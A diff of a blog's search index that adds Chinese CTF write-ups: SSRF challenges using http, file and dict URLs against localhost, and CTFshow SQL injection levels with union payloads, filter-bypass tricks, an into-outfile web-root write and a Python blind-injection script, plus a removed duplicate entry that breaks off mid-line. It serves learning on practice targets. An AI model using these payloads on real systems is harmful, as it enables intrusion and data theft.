@@ -1,6 +1,161 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>ctfhub之ssrf</title>
+    <url>/2021/07/19/ctfhub%E4%B9%8Bssrf/</url>
+    <content><![CDATA[<h1 id="ctfshow之ssrf"><a href="#ctfshow之ssrf" class="headerlink" title="ctfshow之ssrf"></a>ctfshow之ssrf</h1><h2 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h2><h2 id="内网访问（http协议）"><a href="#内网访问（http协议）" class="headerlink" title="内网访问（http协议）"></a>内网访问（http协议）</h2><p>尝试访问位于127.0.0.1的flag.php吧</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>直接构造url<code>?url=http://127.0.0.1/flag.php</code></p>
+<p><img src="https://i.loli.net/2021/07/19/ZWTUa7RtHKGEQe4.png" alt="image-20210719213700332"></p>
+<h2 id="伪协议读取文件（file协议）"><a href="#伪协议读取文件（file协议）" class="headerlink" title="伪协议读取文件（file协议）"></a>伪协议读取文件（file协议）</h2><p>尝试去读取一下Web目录下的flag.php吧</p>
+<p>linux网站的默认目录是<code>/var/www/html</code></p>
+<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><p><code>?url=file:///var/www/html/flag.php</code></p>
+<p><img src="https://i.loli.net/2021/07/19/milXBUDKG3nLSIw.png" alt="image-20210719214708812"></p>
+<p>右键查看页面源码</p>
+<p><img src="https://i.loli.net/2021/07/19/SzAmxP7aE5Yd8wV.png" alt="image-20210719214812341"></p>
+<h2 id="端口扫描（http-dict协议）"><a href="#端口扫描（http-dict协议）" class="headerlink" title="端口扫描（http/dict协议）"></a>端口扫描（http/dict协议）</h2><p>来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦,</p>
+<blockquote>
+<p>在SSRF中，dict协议与http协议可用来探测内网的主机存活与端口开放情况。</p>
+</blockquote>
+<p>这里要对ip进行内网端口探测，使用burp抓包跑一下</p>
+<p>对端口参数添加一下变量</p>
+<p><img src="https://i.loli.net/2021/07/19/SGa76DWRfLE1hkp.png" alt="image-20210719220453504"></p>
+<blockquote>
+<p>这里还可以是dict协议</p>
+</blockquote>
+<p>设置一下参数</p>
+<p><img src="https://i.loli.net/2021/07/19/N1MW9yt2AOE8DFx.png" alt="image-20210719220428828"></p>
+<p>根据长度找到开放的端口为8347，flag存在于响应包中</p>
+<p><img src="https://i.loli.net/2021/07/19/Tbrcm2OsxAEa4n3.png" alt="image-20210719220708156"></p>
+<h2 id="第二部分-gopher协议"><a href="#第二部分-gopher协议" class="headerlink" title="第二部分 gopher协议"></a>第二部分 gopher协议</h2><h2 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h2><p>这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>index.php</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_REQUEST[&#39;url&#39;]))&#123;</span><br><span class="line">    header(&quot;Location: &#x2F;?url&#x3D;_&quot;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ch &#x3D; curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_REQUEST[&#39;url&#39;]);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>dnslog盲打</title>
+    <url>/2021/09/18/dnslog%E7%9B%B2%E6%89%93/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>web入门sql注入</title>
+    <url>/2021/06/24/ctf-web%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="ctf-web入门之sql注入-无过滤注入"><a href="#ctf-web入门之sql注入-无过滤注入" class="headerlink" title="ctf-web入门之sql注入-无过滤注入"></a>ctf-web入门之sql注入-无过滤注入</h1><h2 id="day4-web入门之sql注入-无过滤注入"><a href="#day4-web入门之sql注入-无过滤注入" class="headerlink" title="day4 web入门之sql注入-无过滤注入"></a>day4 web入门之sql注入-无过滤注入</h2><h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><p>单引号报错，使用<code>--+</code>进行注释</p>
+<p>爆出数据库版本号是<code>10.3.18-MariaDB</code>库名为<code>ctfshow_web</code>表名为<code>ctfshow_user</code>字段是<code>id,username,password</code></p>
+<blockquote>
+<p><em>MariaDB</em>数据库管理系统是MySQL的一个分支</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/06/24/kz3GvSAByuUiDY9.png" alt="image-20210624204528172"></p>
+<h3 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h3><p>与web171不同的是，可显列从三变成了二，再就是多了一个表<code>ctfshow_user2</code>，flag就在这个表里（其实题中已经提示了）</p>
+<p><img src="https://i.loli.net/2021/06/24/2cSJZl7hA4x6XqB.png" alt="image-20210624205510547"></p>
+<p><img src="https://i.loli.net/2021/06/24/KmQjsFfcXdAke2N.png" alt="image-20210624205843835"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select version(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;&quot;ctfshow_web&quot;--+</span><br></pre></td></tr></table></figure>
+<h3 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h3><p>多了一个<code>ctfshow_user3</code>的表</p>
+<p>而且会进行正则匹配</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;flag&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p><a href="https://www.cnblogs.com/losesea/p/3438520.html">preg_match用法</a></p>
+<h4 id="hex编码进行绕过"><a href="#hex编码进行绕过" class="headerlink" title="hex编码进行绕过"></a><code>hex编码</code>进行绕过</h4><p>可以直接构造<code>hex()</code>或是先进行十六进制转换</p>
+<p><img src="https://i.loli.net/2021/06/24/EvOMiGnU3PFaJlK.png" alt="image-20210624211902458"></p>
+<p><img src="https://i.loli.net/2021/06/24/W9kKU2fL3B5Xcv8.png" alt="image-20210624211839341"></p>
+<blockquote>
+<p>后面又学到了使用<code>base64</code>进行绕过</p>
+</blockquote>
+<h3 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;flag|[0-9]&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
+<p>对flag和数字进行了过滤，注的时候没有回显</p>
+<p>抓包找一下url</p>
+<p><img src="https://i.loli.net/2021/06/25/CSytwOcmjD3oxXg.png"></p>
+<p>师傅们直接上脚本tql</p>
+<p>fw不会，也想不到wwww</p>
+<p>假期一定学</p>
+<h4 id="盲注脚本"><a href="#盲注脚本" class="headerlink" title="盲注脚本"></a>盲注脚本</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&#x27;</span>:</span><br><span class="line">        url = <span class="string">&quot;http://ca49a442-6c6a-4266-9133-5271c3c12b5a.challenge.ctf.show:8080/api/v4.php?id=&quot;</span></span><br><span class="line">        payload = <span class="string">&#x27;&#x27;&#x27;1&#x27; and substr((select password from ctfshow_user4 where username=&quot;flag&quot;),%d,1)=&quot;%c&quot;--+&#x27;&#x27;&#x27;</span>% (i,j)</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="comment">#print(url+payload)</span></span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210625160944515"></p>
+<h4 id="对数字进行替换base64绕过"><a href="#对数字进行替换base64绕过" class="headerlink" title="对数字进行替换base64绕过"></a>对数字进行替换base64绕过</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;替换username</span><br><span class="line">replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),</span><br><span class="line">&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;, &#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;替换password</span><br><span class="line">replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),</span><br><span class="line">&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;, &#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;拿到替换后的flag</span><br><span class="line">YnumCRmcnumBhvdnumCsnumDYzMnumJYTFiYSnumJnumJZjEnumALTRkZmUtOGRhMSnumJnumJMDFjYWInumENDhiNjdnumI</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;然后再将得到的flag替换回来</span><br><span class="line">import base64</span><br><span class="line">flagstr &#x3D; &#39;YnumCRmcnumBhvdnumCsnumDYzMnumJYTFiYSnumJnumJZjEnumALTRkZmUtOGRhMSnumJnumJMDFjYWInumENDhiNjdnumI&#39;</span><br><span class="line"></span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">flag &#x3D; flagstr.replace(&#39;numA&#39;,&#39;1&#39;).replace(&#39;numB&#39;,&#39;2&#39;).replace(&#39;numC&#39;,&#39;3&#39;).replace(&#39;numD&#39;,&#39;4&#39;).replace(&#39;numE&#39;,&#39;5&#39;).replace(&#39;numF&#39;,&#39;6&#39;).replace(&#39;numG&#39;,&#39;7&#39;).replace(&#39;numH&#39;,&#39;8&#39;).replace(&#39;numI&#39;,&#39;9&#39;).replace(&#39;numJ&#39;,&#39;0&#39;)</span><br><span class="line"></span><br><span class="line">print(base64.b64decode(flag))</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210625173838607"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select to_base64(username), to_base64 (password) from ctfshow_user4 where username&#x3D; &#39;flag&#39; limit 1,1--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1&#39; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;,&#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;, &#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;) from ctfshow_user4 where username&#x3D; &#39;flag&#39; limit 1,1--+</span><br></pre></td></tr></table></figure>
+<p>借助web174的思路，既然可以通过<code>hex</code>绕过，那就去试试</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">numFnumCnumGnumDnumFnumFnumGnumCnumFnumHnumFFnumGnumGnumGBnumCnumHnumFnumCnumCnumCnumCnumDnumFnumAnumCnumAnumFnumBnumFnumAnumBDnumCnumDnumFnumFnumCnumAnumCnumEnumBDnumCnumDnumFnumDnumFnumFnumFnumEnumBDnumCnumHnumFnumDnumFnumAnumCnumAnumBDnumCnumDnumCnumJnumCnumAnumFnumCnumFnumAnumFnumBnumCnumInumCnumDnumCnumHnumFnumBnumCnumFnumCnumGnumGD</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">63746673686F777B38633334613162612D346631352D346466652D386461312D3430316361623934386236377D</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210625180231493"></p>
+<h3 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;[\x00-\x7f]&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>\xnn    匹配ASCII代码中十六进制代码为nn的字符</p>
+<p>[\x00-\x7f]     匹配ASCII值从0-127的字符</p>
+</blockquote>
+<h4 id="利用读写文件写入网站根目录into-outfile注入"><a href="#利用读写文件写入网站根目录into-outfile注入" class="headerlink" title="利用读写文件写入网站根目录into outfile注入"></a>利用读写文件写入网站根目录into outfile注入</h4><p>字段数仍然是二（虽然不会回显，但是错误的话会报接口的错误）</p>
+<p>仿照web174构造</p>
+<p><code>1&#39; union select username,password from ctfshow_user5 where username=&quot;flag&quot; into outfile &#39;/var/www/html/ctfshow.txt&#39; --+ </code></p>
+<p>在网站根目录下写入文件<code>ctfshow.txt</code></p>
+<blockquote>
+<p>Apache默认根目录是:/var/www/html</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210709100434410"></p>
+<h4 id="二分法盲注"><a href="#二分法盲注" class="headerlink" title="二分法盲注"></a>二分法盲注</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>对于无过滤的sql注入，可以通过<code>十六进制</code>或<code>base64</code>编码替换进行绕过，还可以跑盲注脚本，利用二分法或sleep()函数；还可以尝试是否有权限写入网站根目录文件，然后直接访问该文件</p>
+<h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p><a href="https://blog.csdn.net/solitudi/article/details/110144623">[CTFSHOW]SQL注入(WEB入门)</a></p>
+<p><a href="https://yq1ng.github.io/z_post/CTFSHOW-WEB%E5%85%A5%E9%97%A8-Ttick%E6%80%BB%E7%BB%93/#more">CTFSHOW WEB入门 Ttick总结</a></p>
+<p><a href="https://blog.csdn.net/rfrder/article/details/113664639">CTFshow-WEB入门-SQL注入(上)</a></p>
+<h2 id="day5-web入门之sql注入-过滤注入"><a href="#day5-web入门之sql注入-过滤注入" class="headerlink" title="day5 web入门之sql注入-过滤注入"></a>day5 web入门之sql注入-过滤注入</h2><h3 id="web176-select被过滤"><a href="#web176-select被过滤" class="headerlink" title="web176-select被过滤"></a>web176-select被过滤</h3><p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210709105105072"></p>
+<p><code>1&#39; Union select 1,2,3--+</code>无回显</p>
+<p><code>1&#39; union Select 1,2,3--+</code>有回显</p>
+<p>经过测试是只对<code>select</code>进行了过滤，通过大小写绕过</p>
+<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39; union Select 1,group_concat(username),group_concat(password) from ctfshow_user where username=&quot;flag&quot;--+</code></p>
+<h3 id="web177-空格和-被过滤"><a href="#web177-空格和-被过滤" class="headerlink" title="web177-空格和#被过滤"></a>web177-空格和#被过滤</h3><p><code>1&#39;--+</code>无回显，<code>1&#39;--</code>无回显，<code>--</code>被过滤</p>
+<p><code>1&#39;#</code>无回显，<code>#</code>也被过滤，使用url编码<code>%23</code>绕过，<code>1&#39;%23</code>有回显</p>
+<p>而在判断字段时又没有回显，好家伙原来吧空格也过滤了，使用<code>/**/</code>绕过，字段数还是3</p>
+<blockquote>
+<p>空格绕过的方式：</p>
+<ol>
+<li>注释符<code>/**/</code>，tab键<code>%a0</code></li>
+<li>括号绕过，常用于时间盲注</li>
+</ol>
+</blockquote>
+<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39;/**/union/**/select/**/1,group_concat(username),group_concat(password)/**/from/**/ctfshow_user/**/where/**/username=&quot;flag&quot;/**/%23</code></p>
+<h3 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h3><p><code>/**/</code>和<code>%a0</code>被过滤，使用括号或是<code>%0a,%09,%0b,%0c,%0d</code>都行</p>
+<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39;union(select(1),(username),(password)from(ctfshow_user)where(username=&quot;flag&quot;))%23</code></p>
+<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210709170348722"></p>
+<h3 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h3><p>只剩下<code>%0c</code>可以用了，其他都被过滤了</p>
+<p><img src="https://i.loli.net/2021/07/09/iQ5YydxOWqcsouf.png" alt="image-20210709172329770"></p>
+<h4 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39;union%0cselect%0c1,username,password%0cfrom%0cctfshow_user%0cwhere%0cusername=&quot;flag&quot;%0c%0c%23</code></p>
+<p><img src="https://i.loli.net/2021/07/09/AGwtTmJbDRxkiPN.png" alt="image-20210709173023533"></p>
+<p>晴天师傅的通杀payload</p>
+<p><code>?id=&#39;or(1)%23</code></p>
+<h3 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h3><p>是对<code>%23</code>进行了过滤，不能注释后面的’了，只能通过构造<code>&#39;1&#39;=&#39;1</code></p>
+<p>贴上Y4tacker师傅的</p>
+<h4 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h4><p><code>-1&#39;or(id=26)and&#39;1&#39;=&#39;1</code></p>
+<p>-1就是用来注释的，这个payload也相当于<code>&#39;or(id=26)and&#39;1&#39;=&#39;1</code></p>
+<p>放进这个拼接的语句中就是<code>where username !=&#39;flag&#39; and id=&#39;&#39;or(id=26)and&#39;1&#39;=&#39;1&#39; limit 1;&quot;</code></p>
+<p><img src="https://i.loli.net/2021/07/09/N2JdzpWZDRIHT16.png" alt="image-20210709200537410"></p>
+<p>又因为and的优先级比or高，那就又相当于</p>
+<p><code>(username !=&#39;flag&#39; and id = &#39;&#39;)  or  (id=26 and&#39;1&#39;=&#39;1&#39;)</code></p>
+<p>or右边的值为1，可以读出id=26的数据</p>
+<p>还可以盲注</p>
+<p><img src="https://i.loli.net/2021/07/09/vQoe79qtV3Pjg2z.png" alt="image-20210709201034411"></p>
+<h3 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h3><p>除了括号其他能代替的都被过滤了，继续使用y4师傅的payload</p>
+<p><img src="https://i.loli.net/2021/07/09/SvKtyFL3j4oGA7g.png" alt="image-20210709210302177"></p>
+<h3 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h3><p>这次又把<code>flag</code>给过滤了，继续用师傅的payload</p>
+<p><img src="https://i.loli.net/2021/07/09/MxH1Q9EOYT7FNyG.png" alt="image-20210709212746118"></p>
+<h3 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h3><p>我是fw</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/Vinson404/p/7253255.html">sql注入绕过技巧</a></p>
+<h2 id="参考博客-1"><a href="#参考博客-1" class="headerlink" title="参考博客"></a>参考博客</h2><p><a href="https://blog.csdn.net/solitudi/article/details/110144623">[CTFSHOW]SQL注入(WEB入门)</a></p>
+<p><a href="https://yq1ng.github.io/z_post/CTFSHOW-WEB%E5%85%A5%E9%97%A8-Ttick%E6%80%BB%E7%BB%93/#more">CTFSHOW WEB入门 Ttick总结</a></p>
+<p><a href="https://blog.csdn.net/rfrder/article/details/113664639">CTFshow-WEB入门-SQL注入(上)</a></p>
+]]></content>
+      <categories>
+        <category>ctf-sql</category>
+      </categories>
+      <tags>
+        <tag>ctf-sql</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Lampiao</title>
     <url>/2021/05/24/Lampiao/</url>
     <content><![CDATA[<h1 id="Lampiao"><a href="#Lampiao" class="headerlink" title="Lampiao"></a>Lampiao</h1><p><img src="/2021/05/24/Lampiao/image-20210519163046106.png" alt="image-20210519163046106"></p>
@@ -166,223 +321,6 @@
       </tags>
   </entry>
   <entry>
-    <title>web入门sql注入</title>
-    <url>/2021/06/24/ctf-web%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="ctf-web入门之sql注入-无过滤注入"><a href="#ctf-web入门之sql注入-无过滤注入" class="headerlink" title="ctf-web入门之sql注入-无过滤注入"></a>ctf-web入门之sql注入-无过滤注入</h1><h2 id="day4-web入门之sql注入-无过滤注入"><a href="#day4-web入门之sql注入-无过滤注入" class="headerlink" title="day4 web入门之sql注入-无过滤注入"></a>day4 web入门之sql注入-无过滤注入</h2><h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><p>单引号报错，使用<code>--+</code>进行注释</p>
-<p>爆出数据库版本号是<code>10.3.18-MariaDB</code>库名为<code>ctfshow_web</code>表名为<code>ctfshow_user</code>字段是<code>id,username,password</code></p>
-<blockquote>
-<p><em>MariaDB</em>数据库管理系统是MySQL的一个分支</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/06/24/kz3GvSAByuUiDY9.png" alt="image-20210624204528172"></p>
-<h3 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h3><p>与web171不同的是，可显列从三变成了二，再就是多了一个表<code>ctfshow_user2</code>，flag就在这个表里（其实题中已经提示了）</p>
-<p><img src="https://i.loli.net/2021/06/24/2cSJZl7hA4x6XqB.png" alt="image-20210624205510547"></p>
-<p><img src="https://i.loli.net/2021/06/24/KmQjsFfcXdAke2N.png" alt="image-20210624205843835"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select version(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;&quot;ctfshow_web&quot;--+</span><br></pre></td></tr></table></figure>
-<h3 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h3><p>多了一个<code>ctfshow_user3</code>的表</p>
-<p>而且会进行正则匹配</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;flag&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p><a href="https://www.cnblogs.com/losesea/p/3438520.html">preg_match用法</a></p>
-<h4 id="hex编码进行绕过"><a href="#hex编码进行绕过" class="headerlink" title="hex编码进行绕过"></a><code>hex编码</code>进行绕过</h4><p>可以直接构造<code>hex()</code>或是先进行十六进制转换</p>
-<p><img src="https://i.loli.net/2021/06/24/EvOMiGnU3PFaJlK.png" alt="image-20210624211902458"></p>
-<p><img src="https://i.loli.net/2021/06/24/W9kKU2fL3B5Xcv8.png" alt="image-20210624211839341"></p>
-<blockquote>
-<p>后面又学到了使用<code>base64</code>进行绕过</p>
-</blockquote>
-<h3 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;flag|[0-9]&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
-<p>对flag和数字进行了过滤，注的时候没有回显</p>
-<p>抓包找一下url</p>
-<p><img src="https://i.loli.net/2021/06/25/CSytwOcmjD3oxXg.png"></p>
-<p>师傅们直接上脚本tql</p>
-<p>fw不会，也想不到wwww</p>
-<p>假期一定学</p>
-<h4 id="盲注脚本"><a href="#盲注脚本" class="headerlink" title="盲注脚本"></a>盲注脚本</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&#x27;</span>:</span><br><span class="line">        url = <span class="string">&quot;http://ca49a442-6c6a-4266-9133-5271c3c12b5a.challenge.ctf.show:8080/api/v4.php?id=&quot;</span></span><br><span class="line">        payload = <span class="string">&#x27;&#x27;&#x27;1&#x27; and substr((select password from ctfshow_user4 where username=&quot;flag&quot;),%d,1)=&quot;%c&quot;--+&#x27;&#x27;&#x27;</span>% (i,j)</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="comment">#print(url+payload)</span></span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210625160944515"></p>
-<h4 id="对数字进行替换base64绕过"><a href="#对数字进行替换base64绕过" class="headerlink" title="对数字进行替换base64绕过"></a>对数字进行替换base64绕过</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;替换username</span><br><span class="line">replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),</span><br><span class="line">&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;, &#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;替换password</span><br><span class="line">replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),</span><br><span class="line">&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;, &#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;拿到替换后的flag</span><br><span class="line">YnumCRmcnumBhvdnumCsnumDYzMnumJYTFiYSnumJnumJZjEnumALTRkZmUtOGRhMSnumJnumJMDFjYWInumENDhiNjdnumI</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;然后再将得到的flag替换回来</span><br><span class="line">import base64</span><br><span class="line">flagstr &#x3D; &#39;YnumCRmcnumBhvdnumCsnumDYzMnumJYTFiYSnumJnumJZjEnumALTRkZmUtOGRhMSnumJnumJMDFjYWInumENDhiNjdnumI&#39;</span><br><span 